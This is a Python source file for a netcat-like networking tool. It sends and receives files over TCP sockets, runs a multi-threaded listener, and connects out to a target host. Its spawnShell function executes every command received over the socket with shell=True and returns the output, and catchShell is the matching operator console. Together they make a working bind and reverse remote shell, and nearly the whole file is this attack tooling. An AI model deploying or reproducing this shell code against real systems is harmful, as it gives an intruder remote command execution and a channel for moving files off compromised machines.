import os
import socket
import subprocess
import sys
import threading
import tqdm

# Color Settings
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
PURPLE  = "\033[35m"
RESET   = "\033[0m"
BUFF_SZ = 4096
EOF     = "\x90\x90\x90\x90\x90"


def uploadFile (sock, upload):

    fileSize = os.path.getsize (upload)
    sock.send (f"{fileSize}".encode())
    progress = tqdm.tqdm(range (fileSize), f"Sending {GREEN}{upload}{RESET}", unit = "B", unit_scale = True,
                         unit_divisor = BUFF_SZ)
    with open (upload, "rb") as file:
        while True:
            temp = file.read (BUFF_SZ)
            if not temp:
                break
            sock.send (temp)
            progress.update (len (temp))

    sock.close ()
    return True


def downloadFile (sock, download):

    fileSize = sock.recv (BUFF_SZ).decode ()
    fileSize = int (fileSize)
    progress = tqdm.tqdm(range(fileSize), f"Receiving {GREEN}{download}{RESET}", unit = "B", unit_scale = True,
                         unit_divisor = BUFF_SZ)
    with open (download, "wb") as file:
        while True:
            temp = sock.recv (BUFF_SZ)
            if not temp:
                break
            file.write (temp)
            progress.update (len (temp))

    sock.close ()
    return True


def spawnShell (sock):

    userC = "whoami"
    hostC = "hostname"

    try:
        userR = subprocess.check_output (userC, stderr = subprocess.STDOUT, shell = True)
        hostR = subprocess.check_output (hostC, stderr = subprocess.STDOUT, shell = True)
        user = userR.decode().rstrip()
        host = hostR.decode().rstrip()
        prompt = "[" + BLUE + user + RESET + "@" + YELLOW + host + RESET + "]$ "
    except:
        prompt = BLUE + ">> " + RESET

    sock.send (prompt.encode())

    while True:
        try:
            command = sock.recv (BUFF_SZ)
            command = command.decode().rstrip()
            if command == 'exit':
                break
            try:
                output = subprocess.check_output (command, stderr = subprocess.STDOUT, shell = True)
            except:
                output = b"Failed to execute command"

            for lines in range (0, len (output), BUFF_SZ):
                temp = output [lines:lines+BUFF_SZ]
                sock.send (temp)

            sock.send (EOF.encode())

        except KeyboardInterrupt:
            break

    sock.close ()

    return True


def catchShell (sock):

    prompt = sock.recv(BUFF_SZ)
    prompt = prompt.decode()
    command = ""
    while True:
        try:
            command = input(prompt)

            if command == 'exit':
                break

            sock.send(command.encode())
            temp = ""
            output = ""

            while EOF not in temp:
                temp = sock.recv (BUFF_SZ)
                temp = temp.decode ()
                output += temp

            print(output)

        except KeyboardInterrupt:
            break

    sock.send (b'exit')
    return True


def runOperations (sock, upload, download, spawn, catch):
    
    if upload:
        uploadFile (sock, upload)

    if download:
        downloadFile (sock, download)

    if spawn:
        spawnShell (sock)

    if catch:
        catchShell (sock)

    print (BLUE + "[-] " + YELLOW + "Connection Closed" + RESET)


def listenMode (target, upload, download, spawn, catch, port):

    if not target:
        target = "0.0.0.0"

    server = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    server.bind ((target, port))
    server.listen (5)

    while True:
        client, address = server.accept ()
        print (GREEN + "[+] " + YELLOW + f"Connection from {address}" + RESET)
        clientThread = threading.Thread (target = runOperations, args = (client, upload, download, spawn,
                                                                         catch))
        clientThread.start ()
        
        
def clientMode (target, upload, download, spawn, catch, port):

    client = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect ((target, port))
        print (GREEN + "[+]  " + YELLOW + f"Connected to {target}:{port}" + RESET)
        runOperations (client, upload, download, spawn, catch)
    except socket.error as e:
        print (RED + "[!] " + YELLOW + "Connecting to target failed" + RESET)
